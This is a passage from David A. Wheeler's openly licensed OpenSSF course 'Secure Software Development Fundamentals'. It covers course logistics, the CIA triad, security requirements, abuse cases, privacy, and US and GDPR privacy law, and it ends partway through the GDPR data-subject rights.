# Secure Software Development Fundamentals

by David A. Wheeler

This is the content of a trio of self-paced courses. Users can learn from it for free, or apply for a certificate of completion for a fee.

To *take* the course, please go to the [OpenSSF web page on Secure Software Development Fundamentals courses](https://openssf.org/training/courses/).
You can also go directly to its
["Developing Secure Software" (LFD121)](https://training.linuxfoundation.org/training/developing-secure-software-lfd121/)
page on the Linux Foundation Training & Certification site, or to its
[edX page](https://www.edx.org/professional-certificate/linuxfoundationx-secure-software-development-fundamentals).
To get this content in Markdown format, go to <https://github.com/ossf/secure-sw-dev-fundamentals>.

This material is split into 3 smaller courses (part 1-3) that should take ~ 14-18 hours total:

1. Secure Software Development - Part I, Requirements, Design, and Reuse [Covers basics, requirements, design, reuse] - ~ 2-4 hours course only, ~ 4-5 hours total including tests and exploring provided resources/links

2. Secure Software Development - Part II, Implementation - ~ 4-6 hours course only, ~ 5-7 hours total

3. Secure Software Development - Part III, Verification and More Specialized Topics [Covers verification, threat models, cryptography, & other advanced topics] - ~ 3-5 hours course only, ~ 5-6 hours total

These learning materials (including section quizzes) are released under the Creative Commons Attribution (CC-BY) license, specifically CC-BY-4.0. A few images (e.g., from XKCD) have different licenses and are noted as such. We do NOT release the chapter/final exams that way, as that would encourage cheating. If by some circumstance you end up with access to those exams,  DO NOT RELEASE them, please!

We can quickly fix significant mistakes, but we otherwise want to only implement updates every 1-1.5 years so its contents stay relatively stable. You can propose a change via [https://github.com/ossf/secure-sw-dev-fundamentals/issues](https://github.com/ossf/secure-sw-dev-fundamentals/issues). This course content was reconciled with the materials posted on edX as of 2020-12-03. LF Training & Certification has determined, from experience, that it’s safer & more reliable to write/edit content on some other platform and then convert it to edX (that is, instead of Don’t Repeat Yourself (DRY) it is safer to Write Everything Twice (WET)), so that is the process we’re using. The original document was developed using Google docs; other formats are translations, which may have translation errors.

The learning approach is designed to potentially support many users (with a potential of 10-15 million), so all problems (including knowledge checks) must be completely automated. There are no plans to use cohorts, discussions, or anything else requiring human instructors (because that doesn’t scale well). In most cases the knowledge checks are 1-2 multiple choice questions. They will generally have a random *order* of answers, but not Randomized *values* of answer (no Python script is involved).

**Contributor Guidance**

This document is written to be easily understood by its audience (in this case, software developers). In general, in this document:

* Use contractions (unless you want special emphasis on something).
* Use logical quotation, not typographical quotation. Quotations only include what is quoted. For more, see [Wikipedia: Logical quotation on Wikipedia](https://en.wikipedia.org/wiki/Wikipedia:Logical_quotation_on_Wikipedia).
* Use pronouns, especially *you*.
* Use Oxford commas.
* Cite sources.

For more, see [5 Stupid Grammar Rules You Should Never Follow Because They Make Your Writing Worse](https://www.inc.com/minda-zetlin/5-stupid-grammar-rules-you-should-never-follow-because-they-make-your-writing-wo.html) and [6 Grammar Superstitions: The Never-Never Rules](https://wac.colostate.edu/docs/books/grammar/chapter6.pdf).

Note that edX requires groupings at 3 levels: Sections, Subsections, and Units. Only Units (level 3) can have content.  We represent this in the material below as follows:  A “Heading 1” represents the beginning of a Section and contains ONLY sequences beginning with “Heading 2” (no text). A “Heading 2” represents the beginning of a Subsection and contains ONLY sequences beginning with “Heading 3”. A “Heading 3” represents the beginning of a Unit and contains all content. A Heading 3 cannot be directly contained within a Heading 1. Heading 4 (and below) are used freely within a Unit. Technically quizzes are level 3 in edX, but they are represented as level 4 in the markdown because the quizzes are logically part of the section they quiz.

The primary editable content is in markdown format. There should be no markdownlint errors using our configuration. You can add hyperlinks to internal sections as #<i>section_name</i> where <i>section_name</i> is the title transformed using GitHub's [`gfm_auto_identifiers`](https://pandoc.org/MANUAL.html#extension-gfm_auto_identifiers) algorithm: space becomes `-`, uppercase (ASCII) becomes lowercase, and punctuation (other than `-` and `_`) are removed.

**About this course (Part 1)**

Modern software is under constant attack, but many software developers have never been told how to effectively counter those attacks. This course works to solve that problem, by explaining the fundamentals of developing secure software. Geared towards software developers, DevOps professionals, software engineers, web application developers, and others interested in learning how to develop secure software, this course focuses on practical steps that can be taken, even with limited resources, to improve information security. This course will enable software developers to create and maintain systems that are much harder to successfully attack, reduce the damage when attacks are successful, and speed the response so that any latent vulnerabilities can be rapidly repaired.

This course discusses the basics of security, such as what risk management really means. It discusses how to consider security as part of the requirements of a system, and what potential security requirements you might consider. This part then discusses how to design software to be secure, including various secure design principles that will help you avoid bad designs and embrace good ones. It also discusses how to secure your software supply chain, that is, how to more securely select and acquire reused software (including open source software) to enhance security.

This is the first of the three courses in the Secure Software Development Fundamentals Professional Certificate program, and was developed by the Open Source Security Foundation (OpenSSF), a project of the Linux Foundation focused on securing the open source ecosystem. The training courses included in this program focus on practical steps that you (as a developer) can take to counter most common kinds of attacks.

**What you'll learn (Part 1)**

<ul>
<li>Security basics: risk management, the “CIA” triad, and requirements.</li>
<li>Secure design principles: what are principles such as “least privilege” and how to apply these principles.</li>
<li>Supply chain evaluation: tips on how to choose packages to reuse, and how to reuse them so that you can rapidly be alerted & update.</li>
</ul>

**About this course (Part 2)**

Modern software is under constant attack, but many software developers have never been told how to effectively counter those attacks. This course works to solve that problem, by explaining the fundamentals of developing secure software. Geared towards software developers, DevOps professionals, software engineers, web application developers, and others interested in learning how to develop secure software, this course focuses on practical steps that can be taken, even with limited resources to improve information security. This course will enable software developers to create and maintain systems that are much harder to successfully attack, reduce the damage when attacks are successful, and speed the response so that any latent vulnerabilities can be rapidly repaired.

This course focuses on key implementation issues: input validation (such as why allowlists should be used and not denylists), processing data securely, calling out to other programs, sending output, and error handling. It focuses on practical steps that you (as a developer) can take to counter the most common kinds of attacks.

This is the second of the three courses in the Secure Software Development Fundamentals Professional Certificate program, and was developed by the Open Source Security Foundation (OpenSSF), a project of the Linux Foundation focused on securing the open source ecosystem.

**What you'll learn (Part 2)**

<ul>
<li>Implementation: You’ll learn how to implement much more secure software. This includes how to do Input validation, process data securely, call out to other programs, and send output. You’ll also learn about more specialized approaches, including some basics of cryptography and handling problems (such as error-handling code).</li>
</ul>

**About this course (Part 3)**

Modern software is under constant attack, but many software developers have never been told how to effectively counter those attacks. This course works to solve that problem, by explaining the fundamentals of developing secure software. Geared towards software developers, DevOps professionals, software engineers, web application developers, and others interested in learning how to develop secure software, this course focuses on practical steps that can be taken, even with limited resources to improve information security. This course will enable software developers to create and maintain systems that are much harder to successfully attack, reduce the damage when attacks are successful, and speed the response so that any latent vulnerabilities can be rapidly repaired.

This course discusses how to verify software for security. In particular, it discusses the various static and dynamic analyses approaches, as well as how to apply them (e.g., in a continuous integration pipeline). It also discusses more specialized topics, such as the basics of how to develop a threat model and how to apply various cryptographic capabilities.

This is the third of the three courses in the Secure Software Development Fundamentals Professional Certificate program, and was developed by the Open Source Security Foundation (OpenSSF), a project of the Linux Foundation focused on securing the open source ecosystem. The training courses included in this program focus on practical steps that you (as a developer) can take to counter most common kinds of attacks.

**What you'll learn (Part 3)**

<ul>
<li>Security Verification: How to examine software, include some key tool types, and how to apply them in continuous integration (CI). This includes learning about security code scanners/static application security testing (SAST) tools, software composition analysis (SCA)/dependency analysis tools, fuzzers, and web application scanners.</li>
<li>Threat modeling/Attack modeling: How to consider your system from an attacker’s point of view and how to apply a simple design analysis approach called STRIDE.</li>
<li>Fielding: How to deploy and operate secure software, handle vulnerability reports, and how to rapidly update when reused components have publicly-known vulnerabilities.</li>
<li>Assurance cases & formal methods: The basics of approaches to more strongly analyze and justify that your software is secure.</li>
</ul>

**Meet your instructor**

David A. Wheeler<br>
Director of Open Source Supply Chain Security at The Linux Foundation<br>
Dr. David A. Wheeler is an expert in developing secure software and in open source software (OSS). He is the Director of Open Source Supply Chain Security at the Linux Foundation and teaches graduate courses in developing secure software at George Mason University (GMU) in Fairfax, VA. He has a PhD in Information Technology, a Master's in Computer Science, a certificate in Information Security, a certificate in software engineering, and a B.S. in Electronics Engineering. He is also a Certified Information Systems Security Professional (CISSP) and an IEEE Senior member. He leads the Open Source Security Foundation (OpenSSF) Best Practices Badge project for the Linux Foundation and has served as a lead validator for National Information Assurance Partnership (NIAP) for the (security) Common Criteria. He lives in Northern Virginia.

# Table of contents

[[TOC]]

# Part I: Requirements, Design, and Reuse

# Course Introduction

## Introduction

*Learn the security basics that allow you to develop software that is hardened against attacks, and understand how you can reduce the damage and speed the response when a vulnerability is exploited.*

Modern software is under constant attack, but many software developers have never been told how to effectively counter those attacks. This course works to solve that problem, by explaining the fundamentals of developing secure software. Geared towards software developers, DevOps professionals, software engineers, web application developers, and others interested in learning how to develop secure software, this course focuses on practical steps that can be taken, even with limited resources, to improve information security. This course will enable software developers to create and maintain systems that are much harder to successfully attack, reduce the damage when attacks are successful, and speed the response so that any latent vulnerabilities can be rapidly repaired.

The course discusses risks and requirements, design principles, and evaluating code (such as packages) for reuse. It then focuses on key implementation issues: input validation (such as why allowlists and not denylists should be used), processing data securely, calling out to other programs, sending output, cryptography, error handling, and incident response. This is followed by a discussion on various kinds of verification issues, including tests, including security testing and penetration testing, and security tools. It ends with a discussion on deployment and handling vulnerability reports.

The *Secure Software Development Fundamentals* course was developed by the Open Source Security Foundation (OpenSSF), a project of the Linux Foundation focused on securing the open source ecosystem. The course focuses on practical steps that you (as a developer) can take to counter most common kinds of attacks.

## A Note from the Author

Our thanks to the many people who provided helpful commentary and advice. We especially thank Paul E. Black (NIST), Steve Lipner (SAFECode), Dan Lorenc (Google), Sherif Mansour (OWASP), Yannick Moy (AdaCore), and Ashwin Ramaswami for their thoughtful and specific recommendations.

## Motivation

### Motivation: Why Is It Important to Secure Software?

Every day there is news about computer systems being broken into, often via various vulnerabilities in the software. Insecure software may:

* Release private/secret information (aka *“lose confidentiality”*)

* Lose or corrupt information (aka “*lose integrity*”)

* Lose service (aka *“lose availability”*).

But the problems don’t end there. Any of these can cause *real world* losses. They can cost money, time, trust, and even lives.

Yet developers are often never told how to develop secure software. We should *expect* that developers who are never told how to do something will have a hard time doing it.

This course focuses on helping you understand how to practically develop secure software. By *secure software* we mean software:

* that is much harder for attackers to exploit,

* that limits damage if an exploitation is successful, and

* where vulnerabilities can be fixed and exploitations partially recovered from relatively quickly.

### Motivation: Why Take This course?

Our primary concern is that you learn how to develop *secure* software. Here are some of the features and advantages of this specific course:

1. **Quizzes**. We ask quiz questions along the way to help reinforce concepts. It is easy to disengage with traditional books and videos, thinking that you understand the core concepts even when you don’t. In contrast, the quizzes help reinforce the core concepts so you will understand them.

2. **Free**. If you just want to learn, it doesn’t cost anything! All you need is an internet connection. Many people have limited resources and we want to make sure this information is available to them.

3. **Open Content**. The main informational material is not just “free” in the sense of “no cost” but also in terms of freedom. In particular, the informational content is released under the [Creative Commons Attribution License (CC-BY) version 4.0](https://creativecommons.org/licenses/by/4.0/), so you can reuse it in many ways. We *want* you to use this information! There are some exceptions; we quote other material (such as from xkcd) which are under their own licenses.

4. **Evidence of Completion**. If you want to prove that you learned the material (as opposed to simply seeing some text), that is available. Learners taking the course on the Linux Foundation training platform will be required to pass a final exam in order to complete the course; they will obtain a certificate of completion and will also get a digital badge, which can be shared via social media to showcase their knowledge. On edX this evidence of completion is available at a nominal price by enrolling in a verified track. This might really help you communicate what you know to employers, customers, or potential employers. By comparison, just owning a book doesn’t prove that you have read or understood it.

5. **Accessibility**. We have worked to make this information accessible. We want to make sure that those who are blind, have low vision, color-blindness, and so on can learn from this material.

6. **Applicable to Open Source Software (OSS)**. Many materials on security don’t spend significant time on OSS, or are difficult to apply when developing OSS. Yet OSS is key to modern software development. We include information specifically for those developing and/or using OSS.

7. **Independent of organization size**. We don’t require that you be in a large or small software development organization. Some courses implicitly assume you are in a large software development organization.

8. **Independent of programming language**. Most software developers use multiple programming languages or will switch through their career. With that in mind, this course provides a basic grounding in developing secure software that applies to *many* programming languages. We will use examples from specific programming languages, but we want you to have a firm foundation no matter what you use—now or in the future. You should supplement this information with materials for the specific language or framework you use, but this course will give you the key building blocks to understand and apply those other materials.

9. **Practical**. This course focuses on *practical* advice for the people developing software. In particular, we recommend specific things to do or avoid, etc. It briefly discusses why this advice applies, but this is not a graduate course; we focus more on *what* to do instead of all the theory or technical details behind it.

There are other materials that can provide information about software security. Here are a few worthy alternatives and a contrast to them:

1. The [*Security Engineering*](https://www.cl.cam.ac.uk/~rja14/book.html) book by Ross Anderson focuses on systems as a whole, including hardware and business processes, and focuses on big-picture concerns. However, this book does not cover most of the specifics of how to implement secure software. In contrast, this course (unlike Ross Anderson’s book) takes care to identify and discuss how to counter the most common kinds of security vulnerabilities.

2. [SAFECode training materials](https://safecode.org/training/). SAFECode has a number of training materials available. Some materials are quite good and are videos (while this course is mostly text). Note that many of their materials are often narrowly focused. For example, their course *“Cross Site Scripting (XSS) 101”* is on a single common kind of vulnerability, and *“Secure Java Programming 101”* only applies to one language. Check the dates, as some materials may be out of date. That said, if their materials match what you want, they are definitely worthy alternatives.

3. [OWASP Security Knowledge Framework (OWASP-SKF)](https://www.securityknowledgeframework.org/). “OWASP-SKF is an open source web application that explains secure coding principles in multiple programming languages. The goal of OWASP-SKF is to help you learn and integrate security by design in your software development and build applications that are secure by design. OWASP-SKF does this through manageable software development projects with checklists (using [OWASP-ASVS](https://owasp.org/www-project-application-security-verification-standard/)/[OWASP-MASVS](https://owasp.org/www-project-mobile-security-testing-guide/)  or custom security checklists) and labs to practice security verification (using SKF-Labs, [OWASP Juice-shop](https://owasp.org/www-project-juice-shop/), and best practice code examples from SKF and the [OWASP-Cheatsheets](https://cheatsheetseries.owasp.org)).” In contrast, this course (unlike OWASP-SKF) doesn’t require software development projects and labs.

Choose the material that will provide you with the information you want to learn, and you can certainly use them all if you wish.

With that, let’s begin.

# Security Basics

This chapter provides a high-level overview about security, including definitions of security and privacy, requirements, and risk management.

Learning Objectives:

1. Explain what security means and understand common types of security requirements.

2. Discuss what privacy is, its importance, and privacy requirements.

3. Discuss risk management.

4. Discuss defense-in-breadth and how to apply security concepts in different software development processes.

5. Understand the importance of *Protection, Detection, and Response*.

6. Explain the basics of handling vulnerabilities.

## What Do We Need?

### What Does “Security” Mean?

To get secure software, we first need to understand what *security* means. Different software has different specific security requirements, but many people divide security requirements into three broad objectives - Confidentiality, Integrity, and Availability:

* **Confidentiality**<br>“No unauthorized read” - users are only allowed to read the information they are authorized to read.

* **Integrity**<br>“No unauthorized modification (write or delete)”  - users are only allowed to modify the information they are authorized to modify; modification includes additions, changes, and deletions.

* **Availability**<br>“Keeps working in presence of attack.” - the software keeps working while under attack. A Denial of Service (DoS) attack is an attack that tries to make the software no longer available.

This set of Confidentiality, Integrity, and Availability (CIA) is sometimes called the CIA triad.

![CIA Triad](cia.png)

The CIA Triad

Many add one more security objective: **non-repudiation** or **accountability**. The point of non-repudiation or accountability is that if someone takes certain actions, the system should be able to later prove it, even if the person involved later denies it. Examples of such actions are transferring a large sum of money, deleting something important, sending an important message, or receiving an important message. Some systems do not have such requirements, and even when they do, some people consider this a special case of integrity. Some people add other objectives, too. No matter how you categorize things, it is important to know clearly what the system is supposed to do. Having some simple categories can help you do that.

These security objectives need some supporting mechanisms. For example, confidentiality and integrity require that there be a way to determine if an action is authorized (unless all requests are authorized). Here are some common supporting mechanisms:

* **Identification & Authentication (I&A)**<br>Require users to identify themselves and prove (authenticate) their identity before doing anything that requires authorization. For example, they might use a username or email address as their identity, and use a password or hardware token to authenticate that they really are that user. This is typically done by a login process.

* **Authorization**<br>Determine what that user is allowed (authorized) to do before deciding to do it. You can think of authorization as a list of what each user is allowed to do. If it is easy for an attacker to add authorizations, then secure I&A means little. This is critical for implementing confidentiality and/or integrity. Watch out: the words *authentication* and *authorization* sound similar, but they are not the same thing. You may know exactly who someone is (authentication), but still not allow that person to do something (authorization).

* **Auditing** (aka logging)<br>Record important events to help detect and recover from attacks. Typically these events include log in, log out, and modifying important information. Auditing is often critical for implementing non-repudiation / accountability requirements.

What you specifically do depends on the software you are developing. If you are developing a lower-level library, you might not be directly supporting any of these supporting mechanisms, but you still have to make sure that what you are doing will fit into a larger program.

#### Quiz 1.1: What Does “Security” Mean?

\>\>Match the terms with the correct definitions.<<

Confidentiality : Reads must be authorized

Integrity : Modifications must be authorized

Availability : Software continues working even while being attacked

Identity & authentication (I&A) : Users must declare who they are and prove it

Authorization : Determine what a user is allowed to do

Auditing : Record important events

### Security Requirements

To create software, you need to know what you want it to do. Requirements are simply what a product or service needs to do or be. For our purposes, include in requirements anything required by law or regulation, as well as anything important to its (potential) customers/users. If you are being paid to develop software, requirements are typically recorded somewhere.

In some cases, software must comply with special laws or regulations. This is especially true in areas where vulnerabilities are more likely to lead to significant harm (such as medical, financial, and military systems). This also arises if you are planning to sell software, or a system with software, in many different legal jurisdictions (so there may be many laws or regulations that apply). Again, for our purposes these are all requirements.

Requirements might not be recorded in a single formal document. Sometimes each specific new requirement is simply accepted as an issue in an issue/bug tracker. In most software development projects, the requirements are identified over time in discussions with its users.

Requirements don’t even *have* to be written down to be used, especially for a small project. However, at least in the case of security, it is a good idea to record the high-level security requirements in one place. Then, when someone is thinking about using or modifying your software, they’ll have an idea of what the system is trying to accomplish for security.

Of course, the actual requirements depend on what you’re trying to accomplish.

So how can you determine the security requirements for a particular system? One way to identify security requirements is to think about the common security objectives and supporting security functions we have *already* discussed and determine the specific requirements for your system in each category. In particular, think about how each one applies to the kind of information your program will manage. Let’s walk through each security objective and supporting security function, and discuss some things to consider:

1. **Confidentiality** (“No unauthorized read”)<br>Identify information that should not be publicly revealed, such as private information about people and systems. Who should be allowed to see that? Can you avoid having that information at all (since you cannot reveal what you do not have)? If you store password information so people can log in to your system (aka “inbound” authentication), you need to store this password information using special algorithms designed for it (such as Argon2id), as we will discuss later.

2. **Integrity** (“No unauthorized modification”)<br>Identify information that only some people should be allowed to modify, and who that is.

3. **Availability** (“Keeps working in presence of attack”)<br>What is the impact if it does not work for a while - is that serious? Availability is rarely an absolute. If your system is accessible via the internet, availability is very challenging to provide; a well-resourced attacker can always use a Distributed Denial of Service (DDoS) attack to take down a site, at least for a little while. It is possible to work to counter DDoS attacks, but in the end it can turn into a competition between how many resources each side has.

    Even when availability cannot be universally guaranteed, you can still have secure software by focusing on the bigger-risk items ([Not all attackers are equal: understanding and preventing DoS in web applications](https://r2c.dev/blog/2020/understanding-and-preventing-dos-in-web-apps/), by Jacob Kaplan-Moss, 2020).  In many cases, focus on developing your software so it is not *easy* to overwhelm or take down with simple inputs; make it possible to temporarily scale up the software by rapidly adding new servers; and implement the software so it quickly recovers when an attack ends. To counter the risk that the system might be destroyed or have its data deleted, design the software so its data is easily backed up, and plan for backups. Ensure that data can be backed up to “cold storage” (where the data cannot be corrupted later if the software is subverted). If the system is routinely backed up in operations, you can recover relatively quickly (at least partially). So yes, you *can* have availability as a requirement, as long as its limitations are clear.

4. **Non-repudiation** (“Prove someone did something”)<br>Is there some action that you want to be able to *prove* someone took? In many systems this is not critical, but in some it is.

5. **Identity & authentication (I&A)**<br>How will users prove who they are? You want to make sure that someone cannot spoof a legitimate user. You should normally support two-factor authentication (2FA), either directly or by allowing users to prove their identity via some other service that supports it.

6. **Authorization**<br>Who is allowed to do what? This is a part of confidentiality and integrity, but if you think about people’s roles in addition to thinking about the information to protect, you will probably get a better picture.

7. **Auditing/Logging**<br>What information/events should you record? Typically you at least record login, logout, and important events like user account creation and deletion. Generally a system should record when something happened (date and time), what happened, what system component did it, and who caused it to happen.

You will sometimes see documents that use the security terms “subject” and “object”. A “subject” is something that acts (e.g., a user or process). An “object” is something being acted on (e.g., a file or network port).

Some developers capture some requirements as *use cases*. Each use case is a list of interactions between actor(s) and a system to achieve a goal. This has led to an interesting security approach, the development of *abuse cases* or *misuse cases*. An abuse case is a list of interactions between actors and a system that are intended to cause harm (e.g., to the system, actor(s), or stakeholders). A very similar term is “misuse case”, a description of a malicious act against a system. Many have found it useful to define abuse cases or misuse cases to then describe how the system must *counter* such abuse/misuse. By thinking about abuse and misuse, and figuring out how to counter them early, a lot of mischief can be prevented. Many developers find it hard to *think like an attacker*, so throughout this course we will focus on techniques to help you find vulnerabilities anyway, for example, by identifying common types of vulnerabilities and explaining how to systematically do threat modeling.

An important aspect about security requirements is what kind of attackers you expect to counter. Countering targeted attacks by well-resourced nation-states is extremely difficult; you need to know and apply more than this course can cover by itself. However, most people are not trying to develop systems that withstand these kinds of attacks. In this course, we will assume that your software must stand up to attacks that a typical commercial site might need to counter, where the attacker has limited resources and the attacks are often not highly targeted. If you need to defend against attackers with more resources, you will probably need to do much more, but the material in this course will give you a good starting point.

Note that in this course we focus on attackers, not hackers. In the computer community the term “hacker” is widely used to identify *“a person who delights in having an intimate understanding of the internal workings of a system, computers and computer networks in particular.”* ([IETF RFC 1983](https://tools.ietf.org/html/rfc1983)). By this definition, many hackers never attack computer systems, and many attackers are not hackers. This course focuses on foiling attackers.

If you are looking for ideas for potential security requirements, one source is the [*Common Criteria for Information Technology Security Evaluation” (CC) part 2*](https://www.commoncriteriaportal.org/), which is freely available. The CC is an international standard for evaluating security that was originally developed in 1994. The vast majority of software developed today does not undergo a CC evaluation, in part because it is often both expensive and time-consuming to have an external lab formally evaluate your software using the CC. However, you can still look at the CC for ideas even if you will not use an evaluation lab. The CC is publicly available and has 3 parts: part 1 is an introduction, part 2 is a list of common security functional requirements, and part 3 is a list of common assurance requirements. Part 2 in particular is a list of *“security functions you might require”*. If you suspect your system will need some special security requirements, but are not sure what those might be, part 2 provides a long list of ideas that might be useful. Some of its terminology is arcane, but it includes a glossary which can help.

**Finally:** If there is existing software that does something like the software you are developing, look at its security capabilities. They added those capabilities for a reason, and your software might need at least some of them as well.

#### Quiz 1.2: Security Requirements

\>\>A typical requirement for an Internet-connected service is to stay available regardless of the attacks it undergoes. True or False?<<

( ) True

(x) False

[Explanation]

This is false. It would be great if we could ensure that all Internet-connected services could always stay available. But in most cases, if every device in the world connected to the Internet requested a specific service, that service will be unable to handle the load. At some point, attackers with many resources can usually overwhelm the availability of a defender with few resources.

Of course, we should not make it easy for an attacker to take down a system. So instead, any Internet-connected services we build should be able to handle some moderate request rate so that an attacker has to at least commit nontrivial resources. You could do this by designing the system so that it can rapidly scale to large request sizes, and using other services like content delivery networks (CDNs) to harden the system against large loads. In addition, a service can use techniques like rapid recovery so that even if it is taken down by an attack, it can quickly recover when the attack ends.

[Explanation]

### What Is Privacy and Why It Is Important

Security and privacy are interrelated, but not the same thing. In this unit we will cover what privacy is, its relationship to security, and why privacy is important.

#### What Does Privacy Mean?

The non-profit [International Association of Privacy Professionals (IAPP) defines privacy](https://iapp.org/about/what-is-privacy/) as *“the right to be let alone, or freedom from interference or intrusion”*. More specifically, it says *“Information privacy is the right to have some control over how your personal information is collected and used... various cultures have widely differing views on what a person’s rights are when it comes to privacy and how it should be regulated.”* They also contrast privacy and security: *“Data privacy is focused on the use and governance of personal data—things like putting policies in place to ensure that consumers’ personal information is being collected, shared and used in appropriate ways.”*

Put another way, privacy is about protecting personal data about individuals from abuse.

#### Why Is Privacy Important?

While some have argued that privacy is no longer possible or relevant, many others disagree, and many laws have been put in place around the world to protect privacy. One accessible summary for the widespread position that privacy is important is Glenn Greenwald’s TED Talk [*“Why privacy matters”*](https://www.ted.com/talks/glenn_greenwald_why_privacy_matters) (2014). Here are some of his points (see the talk for details):

* People who say, *“if you’re doing something that you don’t want other people to know, maybe you shouldn’t be doing it in the first place”* are engaged in extreme self-deprecation; *“What they’re really saying is,"I have agreed to make myself such a harmless and unthreatening and uninteresting person that I actually don’t fear having the government know what it is that I’m doing.’”*

* Many of these same people [who make these claims] do not actually act in this way, e.g., they will take many steps to gain privacy for themselves.

* *“There’s a reason privacy is so craved universally and instinctively… when we’re in a state where we can be monitored, where we can be watched, our behavior changes dramatically… There are dozens of psychological studies that prove that when somebody knows that they might be watched, the behavior they engage in is vastly more conformist and compliant.”*

* *“Mass surveillance creates a prison in the mind that is a much more subtle though much more effective means of fostering compliance with social norms or with social orthodoxy, much more effective than brute force could ever be.”*

* *“A society in which people can be monitored at all times is a society that breeds conformity and obedience and submission, which is why every tyrant, the most overt to the most subtle, craves that system.”*

* *“When we allow a society to exist in which we’re subject to constant monitoring, we allow the essence of human freedom to be severely crippled.”*

* *“A system of mass surveillance suppresses our own freedom in all sorts of ways. It renders off-limits all kinds of behavioral choices without our even knowing that it’s happened.”*

### Privacy Requirements

#### Simplest Approach: Don’t Collect Personal Information

The first step for addressing privacy is acknowledging that privacy is important, and then considering how to ensure your software provides adequate privacy if it collects information about individuals.

The simplest approach to privacy, and often the best starting point, is to *not* collect information about individuals unless you need it. If you do not collect the information, you cannot divulge it later, and you do not have to determine how to prevent its misuse. Eliminating it is best from a privacy point of view.

Failing that, minimize personal information to what you absolutely require. If you must collect information about individuals, you must provide a variety of protections for them, at the very least those required by law and regulation. This can be complicated, because many laws and regulations may apply.

#### Privacy Laws and Regulations

Laws and regulations about privacy are widespread. Different terms are used for them, including information privacy, data privacy, and data protection. Whether or not these laws and regulations affect your software depends on what kind of data your software collects. In many cases, software does not need to do anything special for privacy. However, in other cases these laws and regulations can matter greatly.

[Article 17 of the International Covenant on Civil and Political Rights of the United Nations](https://www.ohchr.org/en/professionalinterest/pages/ccpr.aspx) in 1966 is widely ratified and protects privacy. It says, *“No one shall be subjected to arbitrary or unlawful interference with his privacy, family, home or correspondence, nor to unlawful attacks on his honour and reputation. Everyone has the right to the protection of the law against such interference or attacks.”*

Different countries, and provinces/states within countries, have different laws regarding privacy. Here we will briefly discuss the US and European approaches.

#### United States

The United States (US) does not have a comprehensive information privacy law as a whole. Instead, the US federal government has a number of laws that cover specific circumstances. This includes the Family Educational Rights and Privacy Act of 1974 (FERPA) for student education records, the Health Insurance Portability and Accountability Act of 1996 (HIPAA) for health-related data, the Children’s Online Privacy Protection Act of 1998 (COPPA) for data related to children, and the Fair and Accurate Credit Transactions Act of 2003 (FACTA) for some financial data.

The [US Privacy Act of 1974 (5 U.S.C. 552a)](https://www.govinfo.gov/content/pkg/USCODE-2018-title5/pdf/USCODE-2018-title5-partI-chap5-subchapII-sec552a.pdf) mandates how US federal agencies must maintain records about individuals who are US citizens and lawful permanent resident aliens. For example, they must:

* collect only relevant and necessary information that is relevant and necessary to carry out an agency function;

* explain at the time the information is being collected, why it is needed and how it will be used;

* ensure that the records are used only for the reasons given, or seek the person’s permission when another purpose for the records’ use is considered necessary or desirable;

* provide adequate safeguards to protect the records from unauthorized access and disclosure; and

* allow people to see the records kept on them and provide them with the opportunity to correct inaccuracies in their records.

Some US states have additional laws. For example, the [California Online Privacy Protection Act (OPPA) of 2003](https://leginfo.legislature.ca.gov/faces/codes_displaySection.xhtml?lawCode=BPC&sectionNum=22575) requires operators of commercial web sites or online services *“that collects personally identifiable information through the Internet about individual consumers residing in California who use or visit its [site or service must] conspicuously post its privacy policy…”* and comply with it. More recently, the [California Consumer Privacy Act of 2018 (CCPA)](https://leginfo.legislature.ca.gov/faces/codes_displayText.xhtml?division=3.&part=4.&lawCode=CIV&title=1.81.5), which became effective in 2020, gives California residents additional rights to know what personal information has been collected by businesses, and to opt out of the sale of that information.

Europe *does* have a comprehensive law, and even those outside Europe often must comply with it. So let’s focus on it; it applies to many situations, and understanding it will help you understand other privacy requirements.

#### European General Data Protection Regulation (GDPR)

The European General Data Protection Regulation (GDPR) protects the personal data of subjects who are in the European Union (EU). It applies whether or not the data processing occurs within the EU, and it applies whether or not the subjects are European citizens. As a result, the GDPR applies in many circumstances. [The Linux Foundation has a summary of the GDPR](https://www.linuxfoundation.org/wp-content/uploads/2018/05/lf_gdpr_052418.pdf) that highlights issues important to software developers. Below we point out some GDPR basics from the Linux Foundation’s GDPR summary.

But first: complying with the GDPR is important. Serious infringements can result in a fine of up to €20 million, or 4% of a firm’s worldwide annual revenue from the preceding financial year, whichever amount is *higher*.

The GDPR defines personal data (requiring protection as such) as *“any information relating to an identified or identifiable natural person (‘data subject’); an identifiable natural person is one who can be identified, directly or indirectly, in particular by reference to an identifier such as a name, an identification number, location data, an online identifier or to one or more factors specific to the physical, physiological, genetic, mental, economic, cultural or social identity of that natural person”*. Note that it is not just data that identifies an individual - it is data that is connected to data that identifies an individual. For example, a person’s mailing address is personal data; details about a person’s skills or preferences are also personal data if they are linked, or reasonably capable of being linked, to other information identifying that individual.

Under the GDPR some personal data are considered more sensitive, and there are greater restrictions on collecting and processing them. These include:

* racial or ethnic origin

* political opinions, religious or philosophical beliefs, or trade union membership

* genetic data

* biometric data for the purpose of uniquely identifying a natural person

* data concerning health

* data concerning a natural person’s sex life or sexual orientation

Personal data is *processed* any time an operation is performed on it. This includes collecting, storing, viewing, transmitting, and deleting it, whether or not by automated means. In the GDPR, a “controller” is the person or organization who determines the purpose and means of processing. A “processor” is a third party that processes the data on a controller’s behalf.

The GDPR defines seven primary principles for processing personal data. These principles inform the purposes of all of the specific provisions of the GDPR. Understanding them goes a long way towards having a good initial insight for whether a particular use of personal data is likely to be acceptable. These are:

1. **Lawfulness, Fairness and Transparency**<br>Process personal data in a way that is legal, fair and transparent to the data subject.

2. **Purpose Limitation**<br>Only process personal data in ways that are compatible with the legitimate purposes for which it was collected.

3. **Data Minimization**<br>Limit the personal data you collect to what’s adequate for those purposes.

4. **Accuracy**<br>Keep personal data accurate and up to date, and take every reasonable step to erase or rectify inaccurate data.

5. **Storage Limitation**<br>Store personal data in a form which permits identification for no longer than needed for the purposes for which it was collected.

6. **Integrity and Confidentiality**<br>Process personal data in a way that ensures appropriate security.

7. **Accountability**<br>A controller of personal data is responsible for the above principles, and for demonstrating its compliance with them.

Six articles in the GDPR lay out specific rights given to individuals regarding their personal data. This gives EU residents the right to contact a data controller and request that it take certain actions (*GDPR requests*). Since EU residents have these rights, software systems and organizational processes must be designed to enable these rights. The types of requests described in the GDPR include the following:

* **Right of Access** (Art. 15)<br>Data subjects can ask whether their personal data is being processed. If it is, they can receive “access” to the data (e.g., a copy or screenshot of it) and information regarding the processing.

